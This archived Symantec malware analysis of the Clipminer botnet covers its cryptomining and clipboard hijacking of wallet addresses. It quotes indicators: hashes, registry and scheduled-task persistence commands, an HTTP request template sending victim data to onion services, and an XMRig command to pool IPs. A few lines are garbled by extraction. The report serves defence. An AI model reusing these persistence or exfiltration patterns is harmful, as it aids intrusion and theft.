{
    "id": "09e4b6f0-c67f-41f5-93b5-7776c2ec1b9d",
    "created_at": "2023-01-12T15:02:44.158874Z",
    "updated_at": "2025-03-27T02:06:00.804017Z",
    "deleted_at": null,
    "sha1_hash": "ee2addbde6d661272e071bd0653e2665da58c5af",
    "title": "2022-06-02 - Clipminer Botnet Makes Operators at Least $1.7 Million",
    "authors": "",
    "file_creation_date": "2022-08-18T03:22:47Z",
    "file_modification_date": "2022-08-18T03:22:47Z",
    "file_size": 1056057,
    "plain_text": "# Clipminer Botnet Makes Operators at Least $1.7 Million\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clipminer-bitcoin-mining-hijacking](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clipminer-bitcoin-mining-hijacking)**\n\nThreat Hunter TeamSymantec\n\nSymantec’s Threat Hunter Team, a part of [Broadcom Software, has uncovered a cyber-criminal operation that has potentially made the actors](https://software.broadcom.com/)\nbehind it at least $1.7 million in illicit gains from cryptocurrency mining and theft via clipboard hijacking.\n\nThe malware being used, tracked by Symantec as Trojan.Clipminer, has a number of similarities to another crypto-mining Trojan called\n[KryptoCibule, suggesting it may be a copycat or evolution of that threat.](https://www.welivesecurity.com/2020/09/02/kryptocibule-multitasking-multicurrency-cryptostealer/)\n\nClipminer is likely spread via Trojanized downloads of cracked or pirated software. The malware arrives on compromised computers as a selfextracting WinRAR archive that drops and executes a downloader in the form of a packed portable executable DLL file with CPL file extension\n(although it does not follow the CPL format). The dropped file connects to the Tor network to download Clipminer’s components.\n\nClipminer has the ability to use compromised computers’ resources to mine for cryptocurrency. The malware also modifies the clipboard\ncontent in an attempt to redirect cryptocurrency transactions by users of the infected computer. On each clipboard update, it scans the\nclipboard content for wallet addresses, recognizing address formats used by at least a dozen different cryptocurrencies. The recognized\naddresses are then replaced with addresses of wallets controlled by the attacker. For the majority of the address formats, the attackers provide\nmultiple replacement wallet addresses to choose from. The malware then picks the address that matches the prefix of the address to be\nreplaced. This way, the victim is less likely to notice manipulation and is likely to proceed with the transaction. The malware includes a total of\n4,375 unique addresses of wallets controlled by the attacker. Out of these, 3,677 addresses are used for just three different formats of Bitcoin\naddresses. Investigating just Bitcoin and Ethereum wallet addresses, we found that they, at the time of writing, contained approximately 34.3\nBitcoin and 129.9 Ethereum. However, some funds had also been transferred to what appear to be cryptocurrency tumblers, also known as\ncryptocurrency mixing services. These services mix potentially identifiable funds with others, so as to obscure the trail back to the fund's\noriginal source. If we include the funds transferred out to these services, the malware operators have potentially made at least $1.7 million\nfrom clipboard hijacking alone.\n\n## Technical analysis\n\n\n-----\n\ne ect o c a beg s t a se e t act g a c e\n(bd48b5da093a37cfa5e3929c19ac06ce711bd581bc49040e68d2ba0e5610bf71) that drops and executes the masqueraded Control Panel\n(CPL) file:\n\n1d31bea6a065fa20cf41861d21b7ea39979d40126c800ebc87d07adb41fe03f4 - m5ak8iW.cpl\n\nThe dropped file is actually a downloader in the form of a packed portable executable DLL, which has the following exports:\n\nGetExtensionVersion\nHttpExtensionProc\nTerminateExtension\n\nOnce the sample is executed, it arranges for itself to start again in case it gets interrupted.\n\nTo do so, it renames itself using the following format:\n\nC:\\Windows\\Temp\\[VARIABLE]\n\nIt also creates the following registry value:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\[VARIABLE]\\\"\n\n[VARIABLE]\"=\"SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \\\"C:\\\\Windows\\\\Temp\\\\[VARIABLE].\\\"\"\n\n(Note the extra DOT at the end of the filename)\n\nExample file name:\n\nC:\\Windows\\Temp\\and.loc\n\nExample corresponding registry value:\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\zyqz\n\"ipbfa\"=\"SHELL32.DLL|ShellExec_RunDLL|REGSVR32.EXE -s \\\"C:\\\\Windows\\\\Temp\\\\and.loc.\\\"\"\n\nBoth of these will be deleted by the sample once it successfully downloads and installs its payload.\n\n[Next, the malware starts an embedded Tor client by downloading Tor consensus data:](https://metrics.torproject.org/glossary.html#consensus)\n\nhttp://[HOST_IP_AND_PORT]/tor/status-vote/current/consensus.z\n\nWhere [HOST_IP_AND_PORT] is picked from a list embedded by the sample.\n\nThe malware then connects to the Tor network.\n\nNext, it collects details from the affected computer, as shown in the following example:\n\n[PUBLIC_IPv4_ADDRESS_AS_SEEN_ON_INTERNET];[REDACTED];\"Intel(R) Core(TM) i5-10500 CPU @\n3.10GHz\";L\"\\x005CDevice\\x005CHarddiskVolume3\\x005CWindows\\x005CSystem32\\x005Crundll32.exe\",L\"\\x005CDevice\\x005CHarddiskVolume3\n\n[REDACTED]\\x005CAppData\\x005CLocal\\x005CTemp\\x005CM5aK8iW.cpL\";\"BC711 NVMe SK hynix 128GB[REDACTED];L\"Windows\nDefender\":61100;\"PCI\\[REDACTED]\":\"Intel(R) UHD Graphics; 630\":1920:1200:59;113:[LIST_OF_RUNNING_PROCESSES];1920:1200:\n\n[DESKTOP_SCREENSHOT_AS_BASE64_ENCODED_PNG];\n\nIt then sends the following HTTP GET request to an Onion Service over Tor:\n\nhttp://[ONION_SERVICE_AND_PORT]/[BINARY_AS_BASE64_ENCODED]\n\nWhere [BINARY_AS_BASE64_ENCODED] is a blob that appears to contain details of the infected machine, and\n\n[ONION_SERVICE_AND_PORT] is one of the following:\n\nmiwia5zo4oxcj7n6:11472\n6lmt3ott62q5pwae:52403\nnczflpbaow2ta7ua:19155\nre5sb73yb75nbkrm:33033\nqwhbbp6ye2l25wv6:13927\n2q3n7ycm7vxe73g6:30656\nw4qjsuu5x5kwvkgu:61921\ngk7jrmr5v3nw3u7m:40090\nip2djbz3xidmkmkw:53148\npvy2atf27dq2d334:2720\n3wquaem4x5qylhs5:17953\n\n\n-----\n\ndd j qyc6 c 36583\nga3zm6uelxuniyq4:60117\nsv2fubnuttyzvfgl:39828\nkzzuxfvchn5kb73c:21646\np2dw3umgw6qhrld3:25947\nwkhipwh6fb5j5hzx:25280\nml7sphy7w3k2ge6d:12508\ndvivtswsxdxsqqxa:26960\ntq2srsgevhutzw42:43477\nxh6pciiw6yeqz3bs:19956\nxup6y7cxgjorezif:51516\nlbwgagk54ww5c3nj:32284\nrim3qyk3tdbt2iw3:60747\nkrq2qyjhfwh4trww:51499\nobowq55leh2wguwg:35882\nxph6exfmdo7b4tkw:38607\nrs24qxgkhecjcgdn:51533\ni3uhj2pyh4cwwbmy:54343\n7udhxrfpz6qwvspy:31399\nnwogcq7cmhth7e4x:15588\ngwtpcz4n3wtkwhj4:64393\n5fajnveyn2bd4nm7:5990\nvcammjx7ddus5kfr:64148\n42xgf6qae5wjbcva:45252\n\nNote that the above are v2 Onion Services. In 2021, v2 Onion Services were depreciated and are no longer supported by current versions of\nTor. However, many nodes on the Tor network have yet to be upgraded, meaning the services are still reachable.\n\nThe received response is roughly 10 MB in size and contains the Clipminer payload, which is used to perform coin mining and clipboard\nhijacking on the compromised computer.\n\nThe payload is stored in the following location:\n\n[EXISTING_TOP_DIRECTORY]\\[VARIABLE]\\[VARIABLE]\\\n\nWhere [EXISTING_TOP_DIRECTORY] is one of the following:\n\nC:\\Program Files (x86)\\\nC:\\Program Files (x86)\\Common Files\\\nC:\\ProgramData\\\n\n[USERPROFILE]\\AppData\\Local\\\n\nThe following is an example of the location and directory naming convention used by the malware:\n\nC:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\\n\nIt also populates the two newly created directories with files copied from the local machine so that the malicious files are less likely to stand\nout.\n\nIt then drops the load point to the inner directory, where file hash, file directory, and file name vary:\n\nf49a5a0f2397609a3fb97728b5a997eb77cfa1b529188403fb5e8adaeac1860b rhnoiniye_ni.dll (Packed load point)\n\nThen it creates scheduled tasks (similar to the following examples) to execute the load point for persistence (details vary between runs):\n\nURI: \\Microsoft\\Windows\\Active Directory Rights Management Services Client\\Microc040e\n\nActions: Exec\n\nCommand: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\n\nArguments: /u \"C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\\imsgt_dvepr.dll\"\n\nWorkingDirectory: C:\\Program Files (x86)\\Common Files\\DevelTies\\JueuiSirvices\n\nIt creates the following empty registry key (likely as an infection marker):\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\[VARYING_UUID_FORMAT]\n\n\n-----\n\no e a p e\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{19C316FE-770F-426C-9B63-F76C34154769}\n\nThe loaded payload starts a v3 Onion Service (the address changes per infection). We also observed traces of another v3 Onion Service\n(possibly used to ping the attackers whenever the compromised machine comes online).\n\nThe payload will monitor keyboard and mouse activity to determine if the machine is in use. It also appears to monitor running processes,\nchecking for analysis/troubleshooting tools.\n\nWhenever the malware determines that a machine is not in use (and at least some of the troubleshooting tools are not used), it starts the\nXMRig cryptocurrency miner. There are some indications that the attackers used a different miner in the past. Also, it is very likely that a\ndifferent miner is used when a dedicated GPU is available (e.g. NVIDIA graphics card).\n\nWe also observed what looks like an XMRig command line (used during injection):\n\n6Y6H --cpu-max-threads-hint=99 -k --pause-on-battery -o 94.75.205.148:443   -o 179.60.146.9:443\n\nThe sample includes a list of IPv4 addresses and picks two each time.\n\nThere is also an example JSONRPC request in memory (before encryption):\n\n{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"login\",\"params\":{\"login\":\"x\",\"pass\":\"x\",\"agent\":\"app/1 (Windows NT 10.0; Win64; x64) libuv/1.41.0 msvc/2019\nrnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx\",\"algo\":\n\n[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/sfx\",\"rx/keva\",\"argon2/chukw\n\nAdditionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers.\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced\nprotection in Symantec products, and offer analysis that helps customers respond to attacks.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-02 - Clipminer Botnet Makes Operators at Least $1.7 Million.pdf"
    ],
    "report_names": [
        "2022-06-02 - Clipminer Botnet Makes Operators at Least $1.7 Million.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535764,
    "ts_updated_at": 1743041160,
    "ts_creation_date": 1660792967,
    "ts_modification_date": 1660792967,
    "files": {
        "pdf": "https://archive.orkl.eu/ee2addbde6d661272e071bd0653e2665da58c5af.pdf",
        "text": "https://archive.orkl.eu/ee2addbde6d661272e071bd0653e2665da58c5af.txt",
        "img": "https://archive.orkl.eu/ee2addbde6d661272e071bd0653e2665da58c5af.jpg"
    }
}